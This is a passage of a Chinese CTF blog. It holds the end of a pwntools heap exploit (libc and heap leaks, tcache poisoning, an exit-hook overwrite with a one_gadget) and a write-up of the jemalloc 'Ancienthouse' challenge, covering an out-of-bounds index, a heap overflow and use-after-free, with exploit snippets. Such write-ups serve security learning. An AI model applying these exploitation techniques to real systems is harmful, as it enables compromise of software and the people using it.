&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line">show((<span class="number">0x7f99c17fbcd0</span>-<span class="number">0x7f99c13df000</span>)/<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x218cc0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">exit_hook = libc_base + <span class="number">0x21a6c8</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xeeccc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr&lt;&lt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">target=((heap_base+<span class="number">0x450</span>)&gt;&gt;<span class="number">12</span>)^(exit_hook-<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,p64(target))</span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,p64(one_gadget)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这是我的第一场国赛，打的很憋屈，可能 70% 的时间都在搭环境</p>
<p>我感觉现在比赛的 libc 版本越来越高了，house of 也越来越多了，打比赛时 2.34 版本的 libc 始终搞不到，搞到了也没有符号表，最后连 GDB 的 heap 指令都没有用就开始强行搞题，搞得我有点崩溃</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/06/Jemalloc+UAF+%E5%A0%86%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/06/Jemalloc+UAF+%E5%A0%86%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">Jemalloc+UAF+堆溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-06 22:11:18 / Modified: 22:15:56" itemprop="dateCreated datePublished" datetime="2022-06-06T22:11:18+08:00">2022-06-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Ancienthouse 复现</strong></p>
<p>这个程序有点特殊，它没有使用 ptmalloc，而是使用了 jemalloc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn_Ancient_House ldd Ancienthouse</span><br><span class="line">	linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fffa5fcc000</span>)</span><br><span class="line">	./libjemalloc.so (<span class="number">0x00007faeaa826000</span>)</span><br><span class="line">	libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007faeaa61f000</span>)</span><br><span class="line">	libpthread.so<span class="number">.0</span> =&gt; /lib/x86_64-linux-gnu/libpthread.so<span class="number">.0</span> (<span class="number">0x00007faeaa5fc000</span>)</span><br><span class="line">	libdl.so<span class="number">.2</span> =&gt; /lib/x86_64-linux-gnu/libdl.so<span class="number">.2</span> (<span class="number">0x00007faeaa5f6000</span>)</span><br><span class="line">	/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007faeaa85e000</span>)</span><br></pre></td></tr></table></figure>
<p>其他信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn_Ancient_House file Ancienthouse</span><br><span class="line">Ancienthouse: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=c89baa4d5cf70d4da6d034cde16c86e4870f2e08, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">➜  pwn_Ancient_House checksec Ancienthouse              </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/pwn_Ancient_House/Ancienthouse&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn_Ancient_House ./Ancienthouse</span><br><span class="line">Who dares to enter these hallowed halls!! : <span class="number">0</span></span><br><span class="line">    _                  _               _     _   _                          </span><br><span class="line">   / \    _ __    ___ (_)  ___  _ __  | |_  | | | |  ___   _   _  ___   ___ </span><br><span class="line">  / _ \  | <span class="string">&#x27;_ \  / __|| | / _ \| &#x27;</span>_ \ | __| | |_| | / _ \ | | | |/ __| / _ \</span><br><span class="line"> / ___ \ | | | || (__ | ||  __/| | | || |_  |  _  || (_) || |_| |\__ \|  __/</span><br><span class="line">/_/   \_\|_| |_| \___||_| \___||_| |_| \__| |_| |_| \___/  \__,_||___/ \___|</span><br><span class="line">                                                                            </span><br><span class="line"></span><br><span class="line">============== MENU ==============</span><br><span class="line">| <span class="number">1.</span> Add Enemy                   |</span><br><span class="line">| <span class="number">2.</span> Battle                      |</span><br><span class="line">| <span class="number">3.</span> Merge                       |</span><br><span class="line">| <span class="number">4.</span> Enter <span class="built_in">any</span> other key to flee |</span><br><span class="line">==================================</span><br><span class="line">&gt;&gt; </span><br></pre></td></tr></table></figure>
<p>大致说明一下程序的逻辑：</p>
<ul>
<li>有点类似于一种 “蚂蚁大战” 的游戏，程序中利用如下结构体来描述一个 “蚂蚁群落”：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Chunk struc ; (<span class="keyword">sizeof</span>=<span class="number">0x14</span>, mappedto_8) ; XREF: .bss:chunk_list/r</span><br><span class="line"><span class="number">00000000</span> name dq ?		<span class="comment">/* 指向一片装有name的heap空间 */</span></span><br><span class="line"><span class="number">00000008</span> num dd ?		<span class="comment">/* 表示群落中蚂蚁的数目 */</span></span><br><span class="line"><span class="number">0000000</span>C index dd ?		<span class="comment">/* 表示该Chunk在chunk_list中的索引 */</span></span><br><span class="line"><span class="number">00000010</span> size dd ?		<span class="comment">/* 表示name的长度 */</span></span><br><span class="line"><span class="number">00000014</span> Chunk ends</span><br></pre></td></tr></table></figure>
<ul>
<li>Add Enemy：添加一个新的 “蚂蚁群落”，默认 chunk-&gt;num 为 “0x64”</li>
<li>Battle：使你的 “蚂蚁群落” 和目标 “蚂蚁群落” 打架，使目标 chunk-&gt;num 减少 “0xf”，如果 chunk-&gt;num 减少为 “0”，则可以选择 “杀死”（释放）它</li>
<li>Merge：选择两个 “蚂蚁群落”，使其合并为一个</li>
<li>Enter any other key to flee：执行一次函数指针，多半需要控制这里</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">battle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> id; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Battle &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter enemy id : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line">  battle_s(id);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 battle 中输入的 id 没有进行检查，造成了数组越位</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There&#x27;s no one here to battle &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Starting battle with %s ....\n&quot;</span>, chunk_list[index]-&gt;name);</span><br><span class="line"><span class="keyword">if</span> ( chunk_list[index]-&gt;num &gt; <span class="number">0</span> )</span><br><span class="line">  chunk_list[index]-&gt;num -= chunk_head-&gt;num;  <span class="comment">// 0xF</span></span><br></pre></td></tr></table></figure>
<ul>
<li>只要 <code>chunk_list[index]</code> 不为空，就可用打印 <code>chunk_list[index]-&gt;name</code> 泄露数据</li>
<li>此外，还可以利用 <code>chunk_list[index]-&gt;num -= chunk_head-&gt;num</code> 修改 index_max</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)index_max )</span><br></pre></td></tr></table></figure>
<ul>
<li>因为 index_max 是 unsigned int 类型，所以负数溢出后 index_max 会变得很大，突破了 add 的限制</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chunk = chunk_list[index1];</span><br><span class="line">chunk-&gt;name = (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(chunk-&gt;name, size1 + size2);</span><br><span class="line">chunk_list[index1]-&gt;size = size1 + size2;</span><br><span class="line">chunk_list[index1]-&gt;num += chunk_list[index2]-&gt;num;</span><br><span class="line">merge_name(chunk_list[index1]-&gt;name, chunk_list[index2]-&gt;name, size1 + size2);</span><br></pre></td></tr></table></figure>
<ul>
<li>前面已经把 <code>chunk_list[index1]-&gt;size</code> 改为了 <code>size1 + size2</code> </li>
<li>后面在执行 merge_name 时，依然使用 <code>size1 + size2</code></li>
<li><code>size2</code> 被加了两遍，造成了堆溢出</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;killed&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[index]-&gt;name);</span><br><span class="line">  chunk_list[index] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>释放时，置空了 <code>chunk_list[index]</code>，但是没有置空 <code>chunk_list[index]-&gt;name</code></li>
<li>可以利用堆风水来泄露 <code>chunk_list-&gt;name</code>（leak heap_addr）</li>
</ul>
<p><strong>泄露 pro_base 的思路</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558ae15df000</span></span><br><span class="line"><span class="number">0x558ae15df000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000558ae15df008</span> <span class="comment">/* off_4008 */</span></span><br><span class="line"><span class="number">0x558ae15df010</span>:	<span class="number">0x00000000fffffff6</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558ae15df020</span> &lt;<span class="built_in">stdout</span>&gt;:	<span class="number">0x00007f3a7b9ad6a0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558ae15df030</span>:	<span class="number">0x00007f3a7a806040</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x558ae15df040</span>:	<span class="number">0x00007f3a7a80a040</span>	<span class="number">0x0000000000000000</span> <span class="comment">/* chunk_list */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000004008</span> <span class="number">08</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_4008 dq offset off_4008             ; DATA XREF: sub_12A0+<span class="number">1B</span>↑r</span><br><span class="line">.data:<span class="number">0000000000004010</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                   index_max dd <span class="number">5</span>                          ; DATA XREF: add+<span class="number">24</span>↑r</span><br></pre></td></tr></table></figure>
<ul>
<li>off_4008 中装的是它自己，它后面“0x8”字节就是 index_max </li>
<li>battle 可以减少 num，并且泄露 name，它们之间也相差“0x8”字节</li>
<li>所以使 index_max 负数溢出的同时，可以泄露 off_4008，绕过 PIE</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">battle(-<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
<p><strong>泄露 heap 的思路</strong></p>
<ul>
<li>在 add 中，程序会先 malloc(0x18) 申请一片空间给 “蚂蚁群落” 结构体 Chunk ，然后再申请 Chunk-&gt;name</li>
<li>如果 Chunk-&gt;name 和 Chunk 属于同一个 run（size大小在同一范围），就会分配到一起</li>
<li>利用堆风水，使 Chunk-&gt;name 分配到已经释放的 Chunk 上，由于释放的 Chunk 中 name 指针没有置空，所以新的 Chunk-&gt;name 可以泄露该指针</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x20</span>) </span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;2&#x27;</span> * <span class="number">0x20</span>) </span><br><span class="line"></span><br><span class="line">kill(<span class="number">0</span>) <span class="comment"># 需要释放两个Chunk,也就是4个region,两个0x60大小,两个0x20大小</span></span><br><span class="line">kill(<span class="number">1</span>) </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># 需要占用两个0x20大小的region,第二个就会作为Chunk-&gt;name</span></span><br><span class="line">battle(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> p_fun = <span class="built_in">malloc</span>(<span class="number">0x50</span>uLL);</span><br><span class="line"> *p_fun = str_fun;</span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line"> ((<span class="keyword">void</span> (__fastcall *)(_QWORD))*p_fun)(p_fun[<span class="number">1</span>]);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>选择“4”会执行一次函数指针 p_fun，我们的目的就是覆盖它为 system（本程序是有 system 的）</li>
</ul>
<p>对于 jemalloc-2.2.5 有一些特点：</p>
<ul>
<li>malloc 分配的数据是连续的，jemalloc-2.2.5 用偏移来获取 region 的位置</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* jemalloc-2.2.5/src/arena.c */</span></span><br><span class="line">ret = (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)run + (<span class="keyword">uintptr_t</span>)bin_info-&gt;reg0_offset +</span><br><span class="line">    (<span class="keyword">uintptr_t</span>)(bin_info-&gt;reg_size * regind));</span><br></pre></td></tr></table></figure>
<ul>
<li>region 的值可以理解为“3”部分相加：<ul>
<li>run：对应 run 的基地址</li>
<li>bin_info-&gt;reg0_offset：此 bin 对应的 run 中第一个 region 的偏移量</li>
<li>bin_info-&gt;reg_size * regind：目标 region 在 run 中的偏移量</li>
</ul>
</li>
<li>在 jemalloc 分配 region 前，会在目标 run 的范围的头部申请一个 arena_run_t 结构体来管理 run</li>
<li>每一个 run 占用的地址空间有一定的规律：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;2&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&#x27;3&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&#x27;4&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;5&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">&#x27;6&#x27;</span> * <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55a84742a040</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55a84742a040</span> —▸ <span class="number">0x7f0d6300a040</span> —▸ <span class="number">0x7f0d63006050</span> ◂— <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55a84742a048</span> —▸ <span class="number">0x7f0d6300a060</span> —▸ <span class="number">0x7f0d6300a080</span> ◂— <span class="string">&#x27;1111111111111111&#x27;</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55a84742a050</span> —▸ <span class="number">0x7f0d6300a0a0</span> —▸ <span class="number">0x7f0d6300b040</span> ◂— <span class="string">&#x27;2222222222222222&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55a84742a058</span> —▸ <span class="number">0x7f0d6300a0c0</span> —▸ <span class="number">0x7f0d63007080</span> ◂— <span class="string">&#x27;3333333333333333&#x27;</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55a84742a060</span> —▸ <span class="number">0x7f0d6300a0e0</span> —▸ <span class="number">0x7f0d630080b0</span> ◂— <span class="string">&#x27;4444444444444444&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55a84742a068</span> —▸ <span class="number">0x7f0d6300a100</span> —▸ <span class="number">0x7f0d6300c080</span> ◂— <span class="string">&#x27;5555555555555555&#x27;</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55a84742a070</span> —▸ <span class="number">0x7f0d6300a120</span> —▸ <span class="number">0x7f0d6300e080</span> ◂— <span class="string">&#x27;6666666666666666&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55a84742a078</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>不管重复多少次后5位始终不变，说明 jemalloc 的分配以 100page 为单位</li>
<li>而 p_fun 是用 malloc(0x50) 分配的，它所在地址为“0x8000”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f8a8c808000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f8a8c808000</span> ◂— <span class="number">0x384adf93</span> <span class="comment">/* arena_run_t[0x50] */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f8a8c808008</span> —▸ <span class="number">0x7f8a8d000d70</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f8a8c808010</span> ◂— <span class="number">0x3000000002</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f8a8c808018</span> ◂— <span class="number">0x3fffffffffffc</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f8a8c808020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7f8a8c808040</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7f8a8c808060</span> —▸ <span class="number">0x563e3dadfb82</span> ◂— endbr64 <span class="comment">/* p_fun */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7f8a8c808068</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x7f8a8c808080</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">5</span> skipped</span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x7f8a8c8080b0</span> ◂— <span class="string">&#x27;4444444444444444&#x27;</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x7f8a8c8080b8</span> ◂— <span class="string">&#x27;44444444&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>因为 p_fun 是 run[0x50] 的第一个 region，申请的 region[0x50] 不可能向上覆盖，所以只能考虑申请 0x40 的 region（因为离得最近）</li>
<li>可以利用堆溢出来修改控制 arena_run_t[0x50] 结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arena_run_s</span> <span class="title">arena_run_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arena_run_s</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_DEBUG</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	magic;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> ARENA_RUN_MAGIC 0x384adf93</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">arena_bin_t</span>	*bin; <span class="comment">/* 与此run关联的bin */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nextind; <span class="comment">/* 下一个从未分配过的区域或nregs的索引 */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	nfree; <span class="comment">/* run中的空闲区域数 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 本次运行中区域的位掩码,每个位对应一个区域,&#x27;0&#x27;表示该区域已使用,&#x27;1&#x27;位值表示相应区域空闲,变量nextind是该数组的第一个非零元素的索引 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> regs_mask[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>我们需要修改的就是这个 arena_run_s-&gt;nfree</li>
</ul>
